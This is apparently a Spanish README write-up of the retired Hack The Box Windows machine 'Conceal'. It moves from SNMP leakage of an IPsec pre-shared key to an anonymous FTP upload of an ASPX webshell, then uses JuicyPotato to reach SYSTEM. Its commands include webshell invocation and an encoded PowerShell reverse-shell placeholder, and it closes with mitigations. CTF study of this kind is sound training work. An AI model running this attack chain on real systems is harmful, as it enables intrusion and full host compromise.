---
machine: Conceal
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, snmp, ipsec, ike, ftp, webshell, juicypotato]
---

# Conceal — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

SNMP con comunidad `public` filtra la PSK de IPsec. Tras conectar por IKE/IPsec se descubre FTP anónimo con escritura, se sube un webshell ASPX y se obtiene una shell. `SeImpersonatePrivilege` permite JuicyPotato hasta SYSTEM.

## Enumeración

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sU -p161,500 --script snmp-info <IP>
snmpwalk -v2c -c public <IP>
```

El SNMP devuelve la PSK de IPsec en un OID de empresa. Se identifica el gateway y se prepara `strongSwan`/`ike-scan`.

## Conexión IPsec

```bash
ike-scan -A <IP>
```

Con la PSK y los parámetros IKE se configura `ipsec.conf` y se levanta el túnel:

```bash
sudo ipsec up conceal
```

Ya dentro de la red, se repite el escaneo y aparecen FTP, HTTP y SMB.

## Acceso inicial

El FTP permite login anónimo y escritura. El servidor web sirve el mismo directorio. Se sube un webshell ASPX:

```bash
ftp <IP>
put shell.aspx
curl 'http://<IP>/shell.aspx?cmd=whoami'
```

Se obtiene una shell como el usuario del servicio.

## Escalada a SYSTEM

```powershell
whoami /priv
```

`SeImpersonatePrivilege` está habilitado. Se sube JuicyPotato y se ejecuta con un CLSID válido:

```powershell
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c powershell -e <payload>" -t * -c <CLSID>
```

La reverse shell resultante es SYSTEM. Se lee la flag y se redacta.

## Evidencia

- `snmpwalk` con la PSK redactada.
- `ipsec status` y conectividad interna.
- Webshell y shell inicial.
- `whoami /priv` y JuicyPotato.

## Lecciones aprendidas

- SNMP puede filtrar material criptográfico.
- Un túnel IPsec no sustituye la segmentación.
- FTP anónimo con escritura y web en el mismo directorio es RCE.
- `SeImpersonatePrivilege` sigue siendo escalada directa.

## Mitigación y detección

- Deshabilitar SNMP o usar v3 con ACLs.
- Rotar PSKs y restringir IKE.
- Deshabilitar FTP anónimo y separar uploads del webroot.
- Aplicar least privilege a cuentas de servicio y parchear el SO.

## Referencias

- <https://www.hackthebox.com/machines/conceal>
- <https://github.com/ohpe/juicy-potato>
- <https://www.strongswan.org/>
